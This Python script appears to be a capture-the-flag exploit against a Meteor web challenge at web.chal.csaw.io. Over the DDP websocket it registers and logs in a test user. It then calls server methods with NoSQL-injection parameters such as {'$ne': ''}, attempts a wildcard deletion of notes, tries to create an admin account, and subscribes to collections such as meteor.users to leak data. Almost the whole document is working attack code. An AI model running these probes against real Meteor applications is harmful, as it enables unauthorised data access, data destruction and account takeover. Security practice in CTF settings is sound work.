import websocket
import json
import time
import hashlib
import base64
import random
import string

def random_id(length=17):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def sha256(password):
    return hashlib.sha256(password.encode()).hexdigest()

def on_message(ws, message):
    print(f"[+] Received: {message}")
    msg = json.loads(message)

    if msg.get("msg") == "connected":
        # First try to create a user
        method_msg = {
            "msg": "method",
            "method": "createUser",
            "id": random_id(),
            "params": [{
                "username": "test@test.com",
                "password": "password123"
            }]
        }
        ws.send(json.dumps(method_msg))

        # Try login
        login_msg = {
            "msg": "method",
            "method": "login",
            "id": random_id(),
            "params": [{
                "user": {"username": "test@test.com"},
                "password": {
                    "digest": sha256("password123"),
                    "algorithm": "sha-256"
                }
            }]
        }
        ws.send(json.dumps(login_msg))

        # Try methods from source code
        methods = [
            "notes.count",
            "notes.remove",
            "notes.private",
            {"method": "notes.count", "params": [{"body": {"$ne": ""}}]},
            {"method": "notes.remove", "params": ["*"]},
            "users.list",
            {"method": "createUser", "params": [{"username": "admin", "password": "admin123"}]},
        ]

        for method in methods:
            if isinstance(method, dict):
                method_msg = {
                    "msg": "method",
                    "method": method["method"],
                    "id": method["method"],
                    "params": method["params"]
                }
            else:
                method_msg = {
                    "msg": "method",
                    "method": method,
                    "id": method,
                    "params": []
                }
            print(f"[*] Trying method: {method}")
            ws.send(json.dumps(method_msg))

        # Try to subscribe to known collections
        collections = [
            "meteor.users",
            "notes",
            "notes.private",
            "allNotes",
            "users",
            "meteor_autoupdate_clientVersions"
        ]

        for coll in collections:
            sub_msg = {
                "msg": "sub",
                "id": f"sub_{coll}",
                "name": coll,
                "params": []
            }
            print(f"[*] Trying to subscribe to: {coll}")
            ws.send(json.dumps(sub_msg))

def on_error(ws, error):
    print(f"[-] Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("[*] Connection closed")

def on_open(ws):
    print("[+] Connected to WebSocket")

    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))

if __name__ == "__main__":
    ws = websocket.WebSocketApp(
        "ws://web.chal.csaw.io:5000/websocket",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    ws.run_forever()

